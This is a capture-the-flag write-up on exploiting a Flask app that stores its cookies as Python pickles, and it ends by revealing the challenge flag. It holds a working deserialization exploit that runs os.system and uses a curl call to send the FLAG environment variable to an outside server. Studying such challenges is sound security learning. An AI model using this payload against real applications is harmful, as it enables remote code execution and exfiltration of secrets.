#### Challenge:

My other pickle challenges seem to be giving you all a hard time, so here's a simpler one to get you warmed up.

[jar.py](./jar.py ":ignore"), [pickle.jpg](./pickle.jpg ":ignore"), [Dockerfile](./Dockerfile ":ignore")

---

#### Solution:

From the provided `Dockerfile` we see that the flag is saved in environment variable `FLAG`. The jar.py is `python-flask` web application save list of items in cookies using `python`'s `pickle` serialization format. The problem with pickle is that it can run arbitrary code. First I crafted a pickle to check if `os` python library can be used and then I exfiltrated the flag variable by sending `curl` request to my web server `X.X.X.X`. Note that these crafted pickles had to be set as the cookie value (hence the base64 encoding).

```python
import pickle
import base64
import time


# class ArbitraryCodeExecutor:
#     def __reduce__(self):
#         import os
#         return (os.system,("sleep 5",)) # payload to check if the pickle is run

### gANjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu

class ArbitraryCodeExecutor:
    def __reduce__(self):
        import os
        return (os.system,("curl -L http://X.X.X.X/`echo $FLAG`",)) # send actual payload

evil_data = pickle.dumps(ArbitraryCodeExecutor())

# the class is only used to create the pickle, it's
# not needed for the arbitrary code execution
del ArbitraryCodeExecutor

print(base64.b64encode(evil_data))

pickle.loads(evil_data)

print(base64.b64encode(evil_data))
```

---

<details><summary>FLAG:</summary>

```text
actf{you_got_yourself_out_of_a_pickle}
```

</details>
<br/>
